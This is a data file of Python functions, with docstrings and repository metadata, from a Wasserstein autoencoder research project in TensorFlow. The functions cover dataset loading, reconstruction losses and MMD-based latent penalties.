{"docstring": "\"\"\"\n    points is a (N, d) tensor\n    we want to return (N,d,N) tensor M, where\n    M(ijk) = (points[i,j] - points[k,j])^2\n\"\"\"\n", "func_signal": "def sq_distances_1d(points):\n", "code": "a = tf.expand_dims(points, 2)\nb = tf.transpose(a, [2, 1, 0])\nreturn tf.multiply(a, a) + tf.multiply(b, b) \\\n        - 2. * tf.multiply(a, b)", "path": "improved_wae.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "# real = self.sample_points\n# reconstr = self.reconstructed\n", "func_signal": "def reconstruction_loss(opts, real, reconstr):\n", "code": "if opts['cost'] == 'l2':\n    # c(x,y) = ||x - y||_2\n    loss = tf.reduce_sum(tf.square(real - reconstr), axis=[1, 2, 3])\n    loss = 0.2 * tf.reduce_mean(tf.sqrt(1e-08 + loss))\nelif opts['cost'] == 'l2sq':\n    # c(x,y) = ||x - y||_2^2\n    loss = tf.reduce_sum(tf.square(real - reconstr), axis=[1, 2, 3])\n    loss = 0.05 * tf.reduce_mean(loss)\nelif opts['cost'] == 'l1':\n    # c(x,y) = ||x - y||_1\n    loss = tf.reduce_sum(tf.abs(real - reconstr), axis=[1, 2, 3])\n    loss = 0.02 * tf.reduce_mean(loss)\nelse:\n    assert False, 'Unknown cost function %s' % opts['cost']\nreturn loss", "path": "wae.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\"Load data from dsprites dataset\n\n\"\"\"\n", "func_signal": "def _load_dsprites(self, opts):\n", "code": "logging.debug('Loading dsprites')\ndata_dir = _data_dir(opts)\ndata_file = os.path.join(data_dir, 'dsprites.npz')\nX = np.load(data_file)['imgs']\nX = X[:, :, :, None]\n\nseed = 123\nnp.random.seed(seed)\nnp.random.shuffle(X)\nnp.random.seed()\n\nself.data_shape = (64, 64, 1)\ntest_size = 10000\n\nself.data = Data(opts, X[:-test_size])\nself.test_data = Data(opts, X[-test_size:])\nself.num_points = len(self.data)\n\nlogging.debug('Loading Done.')", "path": "datahandler.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\"Sample data from the mixture of Gaussians.\n\n\"\"\"\n\n", "func_signal": "def _load_gmm(self, opts):\n", "code": "logging.debug('Loading GMM dataset...')\n# First we choose parameters of gmm and thus seed\nmodes_num = opts[\"gmm_modes_num\"]\nnp.random.seed(opts[\"random_seed\"])\nmax_val = opts['gmm_max_val']\nmixture_means = np.random.uniform(\n    low=-max_val, high=max_val,\n    size=(modes_num, opts['toy_dataset_dim']))\n\ndef variance_factor(num, dim):\n    if num == 1: return 3 ** (2. / dim)\n    if num == 2: return 3 ** (2. / dim)\n    if num == 3: return 8 ** (2. / dim)\n    if num == 4: return 20 ** (2. / dim)\n    if num == 5: return 10 ** (2. / dim)\n    return num ** 2.0 * 3\n\nmixture_variance = \\\n        max_val / variance_factor(modes_num, opts['toy_dataset_dim'])\n\n# Now we sample points, for that we unseed\nnp.random.seed()\nnum = opts['toy_dataset_size']\nX = np.zeros((num, opts['toy_dataset_dim'], 1, 1))\nfor idx in xrange(num):\n    comp_id = np.random.randint(modes_num)\n    mean = mixture_means[comp_id]\n    cov = mixture_variance * np.identity(opts[\"toy_dataset_dim\"])\n    X[idx, :, 0, 0] = np.random.multivariate_normal(mean, cov, 1)\n\nself.data_shape = (opts['toy_dataset_dim'], 1, 1)\nself.data = Data(opts, X)\nself.num_points = len(X)\n\nlogging.debug('Loading GMM dataset done!')", "path": "datahandler.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\"Load CelebA\n\"\"\"\n", "func_signal": "def _load_celebA(self, opts):\n", "code": "logging.debug('Loading CelebA dataset')\n\nnum_samples = 202599\n\ndatapoint_ids = range(1, num_samples + 1)\npaths = ['%.6d.jpg' % i for i in xrange(1, num_samples + 1)]\nseed = 123\nrandom.seed(seed)\nrandom.shuffle(paths)\nrandom.shuffle(datapoint_ids)\nrandom.seed()\n\nsaver = ArraySaver('disk', workdir=opts['work_dir'])\nsaver.save('shuffled_training_ids', datapoint_ids)\n\nself.data_shape = (64, 64, 3)\ntest_size = 20000\nself.data = Data(opts, None, paths[:-test_size])\nself.test_data = Data(opts, None, paths[-test_size:])\nself.num_points = num_samples - test_size\nself.labels = np.array(self.num_points * [0])\nself.test_labels = np.array(test_size * [0])\n\nlogging.debug('Loading Done.')", "path": "datahandler.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "# Example code showing how to load the checkpoint with a modified graph\n", "func_signal": "def examples(opts, wae_model):\n", "code": "checkpoint = opts['checkpoint']\nwith wae_model.sess.as_default(), wae_model.sess.graph.as_default():\n    # Imagine the current graph coincides with the one stored in the\n    # checkpoint up to 2 placeholders replaced with variables.\n    all_vars = tf.get_collection(tf.GraphKeys.GLOBAL_VARIABLES)\n    inputs_vars = tf.get_collection(tf.GraphKeys.GLOBAL_VARIABLES, scope='inputs')\n    vars_to_restore = [v for v in all_vars if v not in inputs_vars]\n    saver = tf.train.Saver(vars_to_restore)\n    saver.restore(wae_model.sess, checkpoint)\n    init = tf.variables_initializer(inputs_vars)\n    init.run()", "path": "improved_wae.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\"Load grassli\n\n\"\"\"\n", "func_signal": "def _load_grassli(self, opts):\n", "code": "logging.debug('Loading grassli dataset')\n\ndata_dir = _data_dir(opts)\nX = np.load(utils.o_gfile((data_dir, 'grassli.npy'), 'rb')) / 255.\n\nseed = 123\nnp.random.seed(seed)\nnp.random.shuffle(X)\nnp.random.seed(seed)\nnp.random.seed()\n\nself.data_shape = (64, 64, 3)\ntest_size = 5000\n\nself.data = Data(opts, X[:-test_size])\nself.test_data = Data(opts, X[-test_size:])\nself.num_points = len(self.data)\n\nlogging.debug('Loading Done.')", "path": "datahandler.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\"\nGiven a sample X of shape (n_points, n_z) find 2d plain\nsuch that projection looks least Gaussian\n\"\"\"\n", "func_signal": "def least_gaussian_2d(self, X):\n", "code": "opts = self.opts\nwith self.sess.as_default(), self.sess.graph.as_default():\n    sample = self.proj_sample\n    optim = self.proj_opt\n    loss = self.proj_loss\n    u = self.proj_u\n    v = self.proj_v\n\n    covhat = self.proj_covhat\n    proj_mat = tf.concat([v, u], 1).eval()\n    dot_prod = -1\n    best_of_runs = 10e5 # Any positive value would do\n    updated = False\n    for _ in xrange(3):\n        # We will run 3 times from random inits\n        loss_prev = 10e5 # Any positive value would do\n        proj_vars = tf.get_collection(\n            tf.GraphKeys.GLOBAL_VARIABLES, scope='leastGaussian2d')\n        self.sess.run(tf.variables_initializer(proj_vars))\n        step = 0\n        for _ in xrange(5000):\n            self.sess.run(optim, feed_dict={sample:X})\n            step += 1\n            if step % 10 == 0:\n                loss_cur = loss.eval(feed_dict={sample: X})\n                rel_imp = abs(loss_cur - loss_prev) / abs(loss_prev)\n                if rel_imp < 1e-2:\n                    break\n                loss_prev = loss_cur\n        loss_final = loss.eval(feed_dict={sample: X})\n        if loss_final < best_of_runs:\n            updated = True\n            best_of_runs = loss_final\n            proj_mat = tf.concat([v, u], 1).eval()\n            dot_prod = tf.reduce_sum(tf.multiply(u, v)).eval()\nif not updated:\n    logging.error('WARNING: possible bug in the worst 2d projection')\nreturn proj_mat, dot_prod", "path": "wae.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\" Paul's MMD++ penalty for all the individual coordinates\n\"\"\"\n", "func_signal": "def mmdpp_1d_penalty(opts, wae_model, sample_pz):\n", "code": "assert opts[\"e_noise\"] in ('gaussian'), \\\n    '1d MMD++ works only with Gaussian encoders!'\n\n# Number of codes per the same pic\nNUMCODES = 10\nn = opts['batch_size']\nN = wae_model.train_size\nkernel = opts['mmd_kernel']\nsigma2_p = opts['pz_scale'] ** 2\n\n# First we need to sample multiple codes per minibatch picture:\n# Qhat sample = Zi1, ..., ZiK from Q(Z|Xi) for i = 1 ... batch_size\n# For that it is enough to sample batch_size * K standard normal vectors\n# rescale those and then add encoder means\neps = tf.random_normal((n * NUMCODES, opts['zdim']),\n                       0., 1., dtype=tf.float32)\nsigmas_q = wae_model.enc_sigmas\nblock_var = tf.reshape(tf.tile(sigmas_q, [1, NUMCODES]), [-1, opts['zdim']])\neps_q = tf.multiply(eps, tf.sqrt(1e-8 + tf.exp(block_var)))\nmeans_q = wae_model.enc_mean\nblock_means = tf.reshape(tf.tile(means_q, [1, NUMCODES]),\n                         [-1, opts['zdim']])\nsample_qhat = block_means + eps_q\n# sample_qhat = tf.random_normal((n * NUMCODES, opts['zdim']),\n#                        0., 1., dtype=tf.float32)\n\ndist_pz = sq_distances_1d(sample_pz)\ndist_qhat = sq_distances_1d(sample_qhat)\ntemp_pz = tf.expand_dims(sample_pz, 2)\ntemp_qhat = tf.expand_dims(sample_qhat, 2)\ntemp_qhat_t = tf.transpose(temp_qhat, [2, 1, 0])\ndist_pz_qhat = tf.multiply(temp_pz, temp_pz) \\\n               + tf.multiply(temp_qhat_t, temp_qhat_t) \\\n               - 2. * tf.multiply(temp_pz, temp_qhat_t)\nmask = block_diagonal(\n    [np.ones((NUMCODES, NUMCODES), dtype=np.float32) for i in range(n)],\n    tf.float32)\nmask = tf.expand_dims(mask, 2)\nmask = tf.transpose(mask, [0, 2, 1])\nmask = tf.tile(mask, [1, opts['zdim'], 1])\ndiag_pz = diag_3d(n, opts['zdim'])\ndiag_qhat = diag_3d(n * NUMCODES, opts['zdim'])\n\nif kernel == 'RBF':\n    # Median heuristic for the sigma^2 of Gaussian kernel\n    sigma2_k = tf.nn.top_k(\n        tf.reshape(dist_pz_qhat, [-1]), n / 2).values[n / 2 - 1]\n    sigma2_k += tf.nn.top_k(\n        tf.reshape(dist_qhat, [-1]), n / 2).values[n / 2 - 1]\n\n    if opts['verbose']:\n        sigma2_k = tf.Print(sigma2_k, [sigma2_k], 'Kernel width:')\n\n    # Part (1)\n    res1 = tf.exp( - dist_pz / 2. / sigma2_k)\n    res1 = tf.multiply(res1, 1. - diag_pz)\n    res1 = tf.reduce_sum(res1) / (n * n - n)\n    # Part (2)\n    res2 = tf.exp( - dist_pz_qhat / 2. / sigma2_k)\n    res2 = tf.reduce_sum(res2) / (n * n) / NUMCODES\n    # Part (3)\n    res3 = tf.exp( - dist_qhat / 2. / sigma2_k)\n    res3 = tf.multiply(res3, 1. - mask)\n    res3 = tf.reduce_sum(res3) * (N - 1) / N / n / (n - 1) / (NUMCODES ** 2)\n    res3 = tf.Print(res3, [res3], 'Qhat vs Qhat off diag:')\n    # Part (4) \n    res4 = tf.exp( - dist_qhat / 2. / sigma2_k)\n    res4 = tf.multiply(res4, mask - diag_qhat)\n    res4 = tf.reduce_sum(res4) / n / NUMCODES / (NUMCODES - 1) / N\n    res4 = tf.Print(res4, [res4], 'Qhat vs Qhat diag:')\n    stat = res1 - 2 * res2 + res3 + res4\n\nelif kernel == 'IMQ':\n    if opts['pz'] == 'normal':\n        Cbase = 2. * opts['zdim'] * sigma2_p\n    elif opts['pz'] == 'sphere':\n        Cbase = 2.\n    elif opts['pz'] == 'uniform':\n        # E ||x - y||^2 = E[sum (xi - yi)^2]\n        #               = zdim E[(xi - yi)^2]\n        #               = const * zdim\n        Cbase = opts['zdim']\n    stat = 0.\n    # scales = [.1, .2, .5, 1., 2., 5., 10.]\n    scales = [(1., 1.), (1./N, N)]\n    for scale, weight in scales:\n        C = Cbase * scale\n        # Part (1)\n        res1 = C / (C + dist_pz)\n        res1 = tf.multiply(res1, 1. - diag_pz)\n        res1 = tf.reduce_sum(res1) / (n * n - n)\n        # res1 = tf.Print(res1, [res1], 'Pz vs Pz:')\n        # Part (2)\n        res2 = C / (C + dist_pz_qhat)\n        res2 = tf.reduce_sum(res2) / (n * n) / NUMCODES\n        # res2 = tf.Print(res2, [res2], 'Pz vs Qhat:')\n        # Part (3)\n        res3 = C / (C + dist_qhat)\n        res3 = tf.multiply(res3, 1. - mask)\n        res3 = tf.reduce_sum(res3) * (N - 1) / N / n / (n - 1) / (NUMCODES ** 2)\n        res3 = tf.Print(res3, [res3], 'Qhat vs Qhat off diag:')\n        # Part (4) \n        res4 = C / (C + dist_qhat)\n        res4 = tf.multiply(res4, mask - diag_qhat)\n        res4 = tf.reduce_sum(res4) / n / NUMCODES / (NUMCODES - 1) / N\n        res4 = tf.Print(res4, [res4], 'Qhat vs Qhat diag:')\n        stat += weight * (res1 - 2 * res2 + res3 + res4)\n\nreturn stat", "path": "improved_wae.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\" Paul's MMD++ penalty\n    For now assuming it works only with Gaussian encoders\n\n    Assuming\n        N is dataset size\n        n is the picture minibatch size\n        k is number of random points per Q(Z|Xi)\n        zi are iid samples from Pz\n        z^i_m is m-th sample from Q(Z|Xi)\n\n    Unbiased statistic is:\n        (1) sum_{i neq j} k(zi, zj) / n / (n-1) -\n        (2) 2 \\sum_{i, j} \\sum_m k(z^i_m, zj) / k / n / n +\n        (3) (N - 1) \\sum_{i neq j} \\sum_{m1, m2} k(z^i_m1, z^j_m2) / n / (n - 1) / k / k / N +\n        (4) \\sum_i \\sum_{m1 neq m2} k(z^i_m1, z^i_m2) / n / k / (k - 1) / N\n\"\"\"\n", "func_signal": "def mmdpp_penalty(opts, wae_model, sample_pz):\n", "code": "assert opts[\"e_noise\"] in ('gaussian'), \\\n    'MMD++ works only with Gaussian encoders!'\n\n# Number of codes per the same pic\nNUMCODES = 10\nn = opts['batch_size']\nN = wae_model.train_size\nkernel = opts['mmd_kernel']\nsigma2_p = opts['pz_scale'] ** 2\n\n# First we need to sample multiple codes per minibatch picture:\n# Qhat sample = Zi1, ..., ZiK from Q(Z|Xi) for i = 1 ... batch_size\n# For that it is enough to sample batch_size * K standard normal vectors\n# rescale those and then add encoder means\neps = tf.random_normal((n * NUMCODES, opts['zdim']),\n                       0., 1., dtype=tf.float32)\nsigmas_q = wae_model.enc_sigmas\nblock_var = tf.reshape(tf.tile(sigmas_q, [1, NUMCODES]), [-1, opts['zdim']])\neps_q = tf.multiply(eps, tf.sqrt(1e-8 + tf.exp(block_var)))\nmeans_q = wae_model.enc_mean\nblock_means = tf.reshape(tf.tile(means_q, [1, NUMCODES]),\n                         [-1, opts['zdim']])\nsample_qhat = block_means + eps_q\n# sample_qhat = tf.random_normal((n * NUMCODES, opts['zdim']),\n#                        0., 1., dtype=tf.float32)\n\nsq_norms_pz, dist_pz = sq_distances(sample_pz)\nsq_norms_qhat, dist_qhat = sq_distances(sample_qhat)\ndotprods_pz_qhat = tf.matmul(sample_pz, sample_qhat, transpose_b=True)\ndist_pz_qhat = sq_norms_pz + tf.transpose(sq_norms_qhat) \\\n               - 2. * dotprods_pz_qhat\n\nmask = block_diagonal(\n    [np.ones((NUMCODES, NUMCODES), dtype=np.float32) for i in range(n)],\n    tf.float32)\n\nif kernel == 'RBF':\n    # Median heuristic for the sigma^2 of Gaussian kernel\n    sigma2_k = tf.nn.top_k(\n        tf.reshape(dist_pz_qhat, [-1]), n / 2).values[n / 2 - 1]\n    sigma2_k += tf.nn.top_k(\n        tf.reshape(dist_qhat, [-1]), n / 2).values[n / 2 - 1]\n\n    if opts['verbose']:\n        sigma2_k = tf.Print(sigma2_k, [sigma2_k], 'Kernel width:')\n    # Part (1)\n    res1 = tf.exp( - dist_pz / 2. / sigma2_k)\n    res1 = tf.multiply(res1, 1. - tf.eye(n))\n    res1 = tf.reduce_sum(res1) / (n * n - n)\n    # Part (2)\n    res2 = tf.exp( - dist_pz_qhat / 2. / sigma2_k)\n    res2 = tf.reduce_sum(res2) / (n * n) / NUMCODES\n    # Part (3)\n    res3 = tf.exp( - dist_qhat / 2. / sigma2_k)\n    res3 = tf.multiply(res3, 1. - mask)\n    res3 = tf.reduce_sum(res3) * (N - 1) / N / n / (n - 1) / (NUMCODES ** 2)\n    res3 = tf.Print(res3, [res3], 'Qhat vs Qhat off diag:')\n    # Part (4) \n    res4 = tf.exp( - dist_qhat / 2. / sigma2_k)\n    res4 = tf.multiply(res4, mask - tf.eye(n * NUMCODES))\n    res4 = tf.reduce_sum(res4) / n / NUMCODES / (NUMCODES - 1) / N\n    res4 = tf.Print(res4, [res4], 'Qhat vs Qhat diag:')\n    stat = res1 - 2 * res2 + res3 + res4\n\nelif kernel == 'IMQ':\n    if opts['pz'] == 'normal':\n        Cbase = 2. * opts['zdim'] * sigma2_p\n    elif opts['pz'] == 'sphere':\n        Cbase = 2.\n    elif opts['pz'] == 'uniform':\n        # E ||x - y||^2 = E[sum (xi - yi)^2]\n        #               = zdim E[(xi - yi)^2]\n        #               = const * zdim\n        Cbase = opts['zdim']\n    stat = 0.\n    # scales = [.1, .2, .5, 1., 2., 5., 10.]\n    scales = [(1., 1.), (1./N, 1)]\n    # scales = [(1., 1.)]\n    for scale, weight in scales:\n        C = Cbase * scale\n        # Part (1)\n        res1 = C / (C + dist_pz)\n        res1 = tf.multiply(res1, 1. - tf.eye(n))\n        res1 = tf.reduce_sum(res1) / (n * n - n)\n        # res1 = tf.Print(res1, [res1], 'Pz vs Pz:')\n        # Part (2)\n        res2 = C / (C + dist_pz_qhat)\n        res2 = tf.reduce_sum(res2) / (n * n) / NUMCODES\n        # res2 = tf.Print(res2, [res2], 'Pz vs Qhat:')\n        # Part (3)\n        res3 = C / (C + dist_qhat)\n        res3 = tf.multiply(res3, 1. - mask)\n        res3 = tf.reduce_sum(res3) * (N - 1) / N / n / (n - 1) / (NUMCODES ** 2)\n        res3 = tf.Print(res3, [res3], 'Qhat vs Qhat off diag [%f]:' % weight)\n        # Part (4) \n        res4 = C / (C + dist_qhat)\n        res4 = tf.multiply(res4, mask - tf.eye(n * NUMCODES))\n        res4 = tf.reduce_sum(res4) / n / NUMCODES / (NUMCODES - 1) / N\n        res4 = tf.Print(res4, [res4], 'Qhat vs Qhat diag [%f]:' % weight)\n        stat += weight * (res1 - 2 * res2 + res3 + res4)\nreturn stat", "path": "improved_wae.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\"Load data from MNIST or ZALANDO files.\n\n\"\"\"\n", "func_signal": "def _load_mnist(self, opts, zalando=False, modified=False):\n", "code": "if zalando:\n    logging.debug('Loading Fashion MNIST')\nelif modified:\n    logging.debug('Loading modified MNIST')\nelse:\n    logging.debug('Loading MNIST')\ndata_dir = _data_dir(opts)\n# pylint: disable=invalid-name\n# Let us use all the bad variable names!\ntr_X = None\ntr_Y = None\nte_X = None\nte_Y = None\n\nwith utils.o_gfile((data_dir, 'train-images-idx3-ubyte'), 'rb') as fd:\n    loaded = np.frombuffer(fd.read(), dtype=np.uint8)\n    tr_X = loaded[16:].reshape((60000, 28, 28, 1)).astype(np.float)\n\nwith utils.o_gfile((data_dir, 'train-labels-idx1-ubyte'), 'rb') as fd:\n    loaded = np.frombuffer(fd.read(), dtype=np.uint8)\n    tr_Y = loaded[8:].reshape((60000)).astype(np.int)\n\nwith utils.o_gfile((data_dir, 't10k-images-idx3-ubyte'), 'rb') as fd:\n    loaded = np.frombuffer(fd.read(), dtype=np.uint8)\n    te_X = loaded[16:].reshape((10000, 28, 28, 1)).astype(np.float)\n\nwith utils.o_gfile((data_dir, 't10k-labels-idx1-ubyte'), 'rb') as fd:\n    loaded = np.frombuffer(fd.read(), dtype=np.uint8)\n    te_Y = loaded[8:].reshape((10000)).astype(np.int)\n\ntr_Y = np.asarray(tr_Y)\nte_Y = np.asarray(te_Y)\n\nX = np.concatenate((tr_X, te_X), axis=0)\ny = np.concatenate((tr_Y, te_Y), axis=0)\nX = X / 255.\n\nseed = 123\nnp.random.seed(seed)\nnp.random.shuffle(X)\nnp.random.seed(seed)\nnp.random.shuffle(y)\nnp.random.seed()\n\nself.data_shape = (28, 28, 1)\ntest_size = 10000\n\nif modified:\n    self.original_mnist = X\n    n = opts['toy_dataset_size']\n    n += test_size\n    points = []\n    labels = []\n    for _ in xrange(n):\n        idx = np.random.randint(len(X))\n        point = X[idx]\n        modes = ['n', 'i', 'sl', 'sr', 'su', 'sd']\n        mode = modes[np.random.randint(len(modes))]\n        point = transform_mnist(point, mode)\n        points.append(point)\n        labels.append(y[idx])\n    X = np.array(points)\n    y = np.array(y)\nself.data = Data(opts, X[:-test_size])\nself.test_data = Data(opts, X[-test_size:])\nself.labels = y[:-test_size]\nself.test_labels = y[-test_size:]\nself.num_points = len(self.data)\n\nlogging.debug('Loading Done.')", "path": "datahandler.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\"Load a dataset and fill all the necessary variables.\n\n\"\"\"\n", "func_signal": "def _load_data(self, opts):\n", "code": "if opts['dataset'] == 'mnist':\n    self._load_mnist(opts)\nelif opts['dataset'] == 'dsprites':\n    self._load_dsprites(opts)\nelif opts['dataset'] == 'mnist_mod':\n    self._load_mnist(opts, modified=True)\nelif opts['dataset'] == 'zalando':\n    self._load_mnist(opts, zalando=True)\nelif opts['dataset'] == 'mnist3':\n    self._load_mnist3(opts)\nelif opts['dataset'] == 'gmm':\n    self._load_gmm(opts)\nelif opts['dataset'] == 'circle_gmm':\n    self._load_mog(opts)\nelif opts['dataset'] == 'guitars':\n    self._load_guitars(opts)\nelif opts['dataset'] == 'cifar10':\n    self._load_cifar(opts)\nelif opts['dataset'] == 'celebA':\n    self._load_celebA(opts)\nelif opts['dataset'] == 'grassli':\n    self._load_grassli(opts)\nelse:\n    raise ValueError('Unknown %s' % opts['dataset'])\n\nsym_applicable = ['mnist',\n                  'dsprites',\n                  'mnist3',\n                  'guitars',\n                  'cifar10',\n                  'celebA',\n                  'grassli']\n\nif opts['input_normalize_sym'] and opts['dataset'] not in sym_applicable:\n    raise Exception('Can not normalyze this dataset')\n\nif opts['input_normalize_sym'] and opts['dataset'] in sym_applicable:\n    # Normalize data to [-1, 1]\n    if isinstance(self.data.X, np.ndarray):\n        self.data.X = (self.data.X - 0.5) * 2.\n        self.test_data.X = (self.test_data.X - 0.5) * 2.\n    # Else we will normalyze while reading from disk", "path": "datahandler.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\"Internal utility for parsing CIFAR data.\n\n# Arguments\n    fpath: path the file to parse.\n    label_key: key for label data in the retrieve\n        dictionary.\n\n# Returns\n    A tuple `(data, labels)`.\n\"\"\"\n", "func_signal": "def load_cifar_batch(fpath, label_key='labels'):\n", "code": "f = utils.o_gfile(fpath, 'rb')\nif sys.version_info < (3,):\n    d = cPickle.load(f)\nelse:\n    d = cPickle.load(f, encoding='bytes')\n    # decode utf8\n    d_decoded = {}\n    for k, v in d.items():\n        d_decoded[k.decode('utf8')] = v\n    d = d_decoded\nf.close()\ndata = d['data']\nlabels = d[label_key]\n\ndata = data.reshape(data.shape[0], 3, 32, 32)\nreturn data, labels", "path": "datahandler.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\" Add ops searching for the 2d plane in z_dim hidden space\n    corresponding to the 'least Gaussian' look of the sample\n\"\"\"\n\n", "func_signal": "def add_least_gaussian2d_ops(self):\n", "code": "opts = self.opts\n\nwith tf.variable_scope('leastGaussian2d'):\n    # Projection matrix which we are going to tune\n    sample = tf.placeholder(\n        tf.float32, [None, opts['zdim']], name='sample_ph')\n    v = tf.get_variable(\n        \"proj_v\", [opts['zdim'], 1],\n        tf.float32, tf.random_normal_initializer(stddev=1.))\n    u = tf.get_variable(\n        \"proj_u\", [opts['zdim'], 1],\n        tf.float32, tf.random_normal_initializer(stddev=1.))\n    npoints = tf.cast(tf.shape(sample)[0], tf.int32)\n\n    # First we need to make sure projection matrix is orthogonal\n\n    v_norm = tf.nn.l2_normalize(v, 0)\n    dotprod = tf.reduce_sum(tf.multiply(u, v_norm))\n    u_ort = u - dotprod * v_norm\n    u_norm = tf.nn.l2_normalize(u_ort, 0)\n    Mproj = tf.concat([v_norm, u_norm], 1)\n    sample_proj = tf.matmul(sample, Mproj)\n    a = tf.eye(npoints)\n    a -= tf.ones([npoints, npoints]) / tf.cast(npoints, tf.float32)\n    b = tf.matmul(sample_proj, tf.matmul(a, a), transpose_a=True)\n    b = tf.matmul(b, sample_proj)\n    # Sample covariance matrix\n    covhat = b / (tf.cast(npoints, tf.float32) - 1)\n    gcov = opts['pz_scale'] ** 2.  * tf.eye(2)\n    # l2 distance between sample cov and the Gaussian cov\n    projloss =  tf.reduce_sum(tf.square(covhat - gcov))\n    # Also account for the first moment, i.e. expected value\n    projloss += tf.reduce_sum(tf.square(tf.reduce_mean(sample_proj, 0)))\n    # We are maximizing\n    projloss = -projloss\n    optim = tf.train.AdamOptimizer(0.001, 0.9)\n    optim = optim.minimize(projloss, var_list=[v, u])\n\nself.proj_u = u_norm\nself.proj_v = v_norm\nself.proj_sample = sample\nself.proj_covhat = covhat\nself.proj_loss = projloss\nself.proj_opt = optim", "path": "wae.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\"\nX is either np.ndarray or paths\n\"\"\"\n", "func_signal": "def __init__(self, opts, X, paths=None, dict_loaded=None, loaded=None):\n", "code": "data_dir = _data_dir(opts)\nself.X = None\nself.normalize = opts['input_normalize_sym']\nself.paths = None\nself.dict_loaded = None\nself.loaded = None\nif isinstance(X, np.ndarray):\n    self.X = X\n    self.shape = X.shape\nelse:\n    assert isinstance(data_dir, str), 'Data directory not provided'\n    assert paths is not None and len(paths) > 0, 'No paths provided for the data'\n    self.data_dir = data_dir\n    self.paths = paths[:]\n    self.dict_loaded = {} if dict_loaded is None else dict_loaded\n    self.loaded = [] if loaded is None else loaded\n    self.crop_style = opts['celebA_crop']\n    self.dataset_name = opts['dataset']\n    self.shape = (len(self.paths), None, None, None)", "path": "datahandler.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "\"\"\"Load data from MNIST files.\n\n\"\"\"\n", "func_signal": "def _load_mnist3(self, opts):\n", "code": "logging.debug('Loading 3-digit MNIST')\ndata_dir = _data_dir(opts)\n# pylint: disable=invalid-name\n# Let us use all the bad variable names!\ntr_X = None\ntr_Y = None\nte_X = None\nte_Y = None\n\nwith utils.o_gfile((data_dir, 'train-images-idx3-ubyte'), 'rb') as fd:\n    loaded = np.frombuffer(fd.read(), dtype=np.uint8)\n    tr_X = loaded[16:].reshape((60000, 28, 28, 1)).astype(np.float)\n\nwith utils.o_gfile((data_dir, 'train-labels-idx1-ubyte'), 'rb') as fd:\n    loaded = np.frombuffer(fd.read(), dtype=np.uint8)\n    tr_Y = loaded[8:].reshape((60000)).astype(np.int)\n\nwith utils.o_gfile((data_dir, 't10k-images-idx3-ubyte'), 'rb') as fd:\n    loaded = np.frombuffer(fd.read(), dtype=np.uint8)\n    te_X = loaded[16:].reshape((10000, 28, 28, 1)).astype(np.float)\n\nwith utils.o_gfile((data_dir, 't10k-labels-idx1-ubyte'), 'rb') as fd:\n    loaded = np.frombuffer(fd.read(), dtype=np.uint8)\n    te_Y = loaded[8:].reshape((10000)).astype(np.int)\n\ntr_Y = np.asarray(tr_Y)\nte_Y = np.asarray(te_Y)\n\nX = np.concatenate((tr_X, te_X), axis=0)\ny = np.concatenate((tr_Y, te_Y), axis=0)\n\nnum = opts['mnist3_dataset_size']\nids = np.random.choice(len(X), (num, 3), replace=True)\nif opts['mnist3_to_channels']:\n    # Concatenate 3 digits ito 3 channels\n    X3 = np.zeros((num, 28, 28, 3))\n    y3 = np.zeros(num)\n    for idx, _id in enumerate(ids):\n        X3[idx, :, :, 0] = np.squeeze(X[_id[0]], axis=2)\n        X3[idx, :, :, 1] = np.squeeze(X[_id[1]], axis=2)\n        X3[idx, :, :, 2] = np.squeeze(X[_id[2]], axis=2)\n        y3[idx] = y[_id[0]] * 100 + y[_id[1]] * 10 + y[_id[2]]\n    self.data_shape = (28, 28, 3)\nelse:\n    # Concatenate 3 digits in width\n    X3 = np.zeros((num, 28, 3 * 28, 1))\n    y3 = np.zeros(num)\n    for idx, _id in enumerate(ids):\n        X3[idx, :, 0:28, 0] = np.squeeze(X[_id[0]], axis=2)\n        X3[idx, :, 28:56, 0] = np.squeeze(X[_id[1]], axis=2)\n        X3[idx, :, 56:84, 0] = np.squeeze(X[_id[2]], axis=2)\n        y3[idx] = y[_id[0]] * 100 + y[_id[1]] * 10 + y[_id[2]]\n    self.data_shape = (28, 28 * 3, 1)\n\nself.data = Data(opts, X3/255.)\ny3 = y3.astype(int)\nself.labels = y3\nself.num_points = num\n\nlogging.debug('Training set JS=%.4f' % utils.js_div_uniform(y3))\nlogging.debug('Loading Done.')", "path": "datahandler.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
{"docstring": "# pics is a [N, H, W, C] tensor\n", "func_signal": "def contrast_norm(pics):\n", "code": "mean, var = tf.nn.moments(pics, axes=[1, 2, 3], keep_dims=True)\nreturn pics / tf.sqrt(var + 1e-08)", "path": "improved_wae.py", "repo_name": "tolstikhin/wae", "stars": 491, "license": "bsd-3-clause", "language": "python", "size": 1355}
